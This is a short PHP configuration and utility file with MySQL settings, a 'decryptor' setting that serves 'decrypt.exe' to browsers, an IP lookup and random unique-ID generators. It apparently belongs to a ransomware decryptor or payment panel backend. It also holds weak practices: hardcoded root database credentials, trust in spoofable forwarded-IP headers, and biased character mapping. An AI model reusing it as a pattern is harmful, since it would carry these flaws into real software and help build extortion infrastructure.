<?php

//mysql settings
$config_mysql_user = "root";
$config_mysql_password = "shittypass";
$config_mysql_db = "dbname";
$config_mysql_host = "localhost";

//decryptor settings
$config_decryptexe_filepath = "decryptexe.txt"; //this is the local file to read
$config_decryptexe_filename = "decrypt.exe"; //this is the filename sent to the browser


//generic function to fetch ip
function getip()
{
    $ip = $_SERVER['REMOTE_ADDR'];
    if ($ip) {
        if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
            $ip = $_SERVER['HTTP_CLIENT_IP'];
        } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
            $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
        } elseif (!empty($_SERVER['HTTP_X_FORWARDED'])) {
            $ip = $_SERVER['HTTP_X_FORWARDED'];
        } elseif (!empty($_SERVER['HTTP_FORWARDED_FOR'])) {
            $ip = $_SERVER['HTTP_FORWARDED_FOR'];
        } elseif (!empty($_SERVER['HTTP_FORWARDED'])) {
            $ip = $_SERVER['HTTP_FORWARDED'];
        } elseif (!empty($_SERVER['HTTP_CF_CONNECTING_IP'])) {
            $ip = $_SERVER['HTTP_CF_CONNECTING_IP'];
        }

        return $ip;
    }
    return '';
}

function get_safestring_from_bytes($random_bytes)
{
    $safe_characters = "abcdefghijklmnopqrstuvwxyzABDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*(),.<>`~";
    $safestring = "";

    for ($i = 0; $i < strlen($random_bytes); $i++) {
        $safestring .= $safe_characters[ord($random_bytes[$i]) % (strlen($safe_characters) - 1)];
    }

    return $safestring;
}

function get_unique_id()
{
    $strong_crypto = true;
    $random_bytes = openssl_random_pseudo_bytes(64, $strong_crypto);

    $safe_characters = "abcdefghijklmnopqrstuvwxyzABDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    $safestring = "";

    for ($i = 0; $i < strlen($random_bytes); $i++) {
        $safestring .= $safe_characters[ord($random_bytes[$i]) % (strlen($safe_characters) - 1)];
    }

    return $safestring;
}